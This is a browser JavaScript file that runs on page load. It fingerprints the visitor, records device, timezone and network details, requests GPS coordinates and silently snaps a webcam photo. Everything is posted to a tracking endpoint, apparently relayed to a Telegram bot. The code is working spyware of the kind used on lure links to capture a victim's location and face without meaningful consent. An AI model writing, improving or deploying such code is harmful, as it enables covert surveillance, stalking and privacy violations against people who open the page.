const API = "/api/track";

// ==============================
// USER + SESSION
// ==============================
function getUserId() {
  let id = localStorage.getItem("user_id");
  if (!id) {
    id = crypto.randomUUID();
    localStorage.setItem("user_id", id);
  }
  return id;
}

const USER_ID = getUserId();
const SESSION_ID = crypto.randomUUID();

// ==============================
// FINGERPRINT
// ==============================
function getFingerprint() {
  return btoa(
    navigator.userAgent +
    screen.width +
    screen.height +
    navigator.language +
    navigator.hardwareConcurrency
  );
}

const FP = getFingerprint();

// ==============================
// SEND FUNCTION
// ==============================
function send(data) {
  fetch(API, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      user_id: USER_ID,
      session_id: SESSION_ID,
      fingerprint: FP,
      ...data
    })
  }).catch(err => console.log("Send error:", err));
}

// ==============================
// INIT DATA (FIXED FIELD NAMES)
// ==============================
send({
  event: "init",
  device: navigator.userAgent,
  os: navigator.platform,
  browser: navigator.appName,
  screen: `${screen.width}x${screen.height}`,
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  time: new Date().toISOString()
});

// ==============================
// NETWORK INFO (FIXED FIELD)
// ==============================
const net = navigator.connection || {};
send({
  event: "network",
  network: net.effectiveType || "unknown",
  downlink: net.downlink || "-"
});

// ==============================
// GPS LOCATION
// ==============================
navigator.geolocation.getCurrentPosition(
  pos => {
    send({
      event: "gps",
      lat: pos.coords.latitude,
      lng: pos.coords.longitude
    });
  },
  () => {
    send({ event: "gps_denied" });
  }
);

// ==============================
// FINAL EVENT CONTROL (IMPORTANT)
// ==============================
let finalSent = false;

function sendFinal(data) {
  if (finalSent) return;
  finalSent = true;

  send({
    event: "final",
    time: new Date().toISOString(),
    ...data
  });
}

// ==============================
// CAMERA CAPTURE (OPTIMIZED)
// ==============================
async function camera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });

    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");

    // ✅ Reduce size for Telegram reliability
    canvas.width = 320;
    canvas.height = 240;

    canvas.getContext("2d").drawImage(video, 0, 0, 320, 240);

    const image = canvas.toDataURL("image/jpeg", 0.5);

    sendFinal({
      image,
      camera: "captured"
    });

    stream.getTracks().forEach(t => t.stop());

  } catch (err) {
    console.log("Camera error:", err);

    sendFinal({
      camera: "denied"
    });
  }
}

// ==============================
// RUN CAMERA
// ==============================
camera();

// ==============================
// FALLBACK (ONLY IF CAMERA FAILS)
// ==============================
setTimeout(() => {
  sendFinal({
    camera: "timeout"
  });
}, 8000);
